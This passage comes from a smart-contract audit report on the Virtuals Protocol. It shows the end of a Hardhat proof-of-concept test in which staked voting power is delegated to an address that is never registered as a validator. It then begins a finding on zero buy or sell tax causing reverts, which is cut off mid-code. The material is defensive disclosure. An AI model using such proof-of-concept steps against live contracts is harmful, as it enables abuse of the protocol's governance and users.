founder...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(agentFactory.target, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;Proposing agent...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tx = await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .proposeAgent(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.name,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.symbol,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tokenURI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.cores,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tbaSalt,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoVotingPeriod,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoThreshold\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await tx.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const filter = agentFactory.filters.NewApplication;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const events = await agentFactory.queryFilter(filter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const event = events[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { id } = event.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent application created with ID: ${id}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { applicationId: id, ...base };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithAgent() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployWithApplication();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, applicationId } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Executing application...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .executeApplication(applicationId, false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryFilter = agentFactory.filters.NewPersona;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvent = factoryEvents[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent created with virtualId: ${virtualId}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ...base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agent: {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        token,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        veToken,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        dao,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tba,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  before(async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Increase timeout for all tests\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(60000);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit(\u0026quot;Delegate a non-validator\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Need to provide LP first\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agent, agentNft, virtualToken } = await loadFixture(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      deployWithAgent\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { trader, poorMan, founder, randomAddr } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const router = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Router02\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_ROUTER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.getContractAt(\u0026quot;AgentToken\u0026quot;, agent.token);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Buy tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const amountToBuy = parseEther(\u0026quot;10000000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const capital = parseEther(\u0026quot;200000000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(trader.address, capital);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(process.env.UNISWAP_ROUTER, capital);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .swapTokensForExactTokens(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        amountToBuy,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        capital,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [virtualToken.target, agent.token],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        trader.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        Math.floor(new Date().getTime() / 1000 + 600000)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ////\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Start providing liquidity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const lpToken = await ethers.getContractAt(\u0026quot;ERC20\u0026quot;, agent.lp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const veToken = await ethers.getContractAt(\u0026quot;AgentVeToken\u0026quot;, agent.veToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await veToken.connect(founder).setCanStake(true);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await lpToken.balanceOf(trader.address)).to.be.equal(0n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(process.env.UNISWAP_ROUTER, parseEther(\u0026quot;10000000\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(process.env.UNISWAP_ROUTER, parseEther(\u0026quot;10000000\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .addLiquidity(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await agentToken.balanceOf(trader.address),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await virtualToken.balanceOf(trader.address),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        0,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        0,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        trader.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        Math.floor(new Date().getTime() / 1000 + 6000)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    /////////////////\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Staking, and able to delegate to anyone\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await lpToken.connect(trader).approve(agent.veToken, parseEther(\u0026quot;100\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await expect(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      veToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .stake(parseEther(\u0026quot;10\u0026quot;), trader.address, poorMan.address)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ).to.be.not.reverted;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Delegate to someone else without adding to the addValidator\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await veToken.connect(trader).delegate(randomAddr);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Assert poorMan as a validator \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await agentNft.isValidator(agent.virtualId , poorMan.address)).to.be.eq(true);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Assert RandomAddress as not a validator\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await agentNft.isValidator(agent.virtualId , randomAddr.address)).to.be.eq(false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert\" style=\"position:relative;\"\u003e\u003ca href=\"#m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert\" aria-label=\"m 15 if ffactorybuytax and  or ffactoryselltax is set to 0 buy  sell would revert permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-55\"\u003e[M-15] If \u003ccode\u003eFFactory::buyTax\u003c/code\u003e and / or \u003ccode\u003eFFactory::sellTax\u003c/code\u003e is set to 0, buy / sell would revert\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-546\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-727\"\u003eNHristov\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L125\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L125\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-9\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-9\" aria-label=\"finding description 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FFactory.sol#L74\"\u003e\u003ccode\u003eFFactory::setTaxParams\u003c/code\u003e\u003c/a\u003e can be called by the admin to change the \u003ccode\u003ebuyTax\u003c/code\u003e and \u003ccode\u003esellTax\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// FFactory.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetTaxParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewVault_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebuyTax_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esellTax_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eADMIN_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewVault_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Zero addresses are not allowed.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewVault_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebuyTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebuyTax_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esellTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan 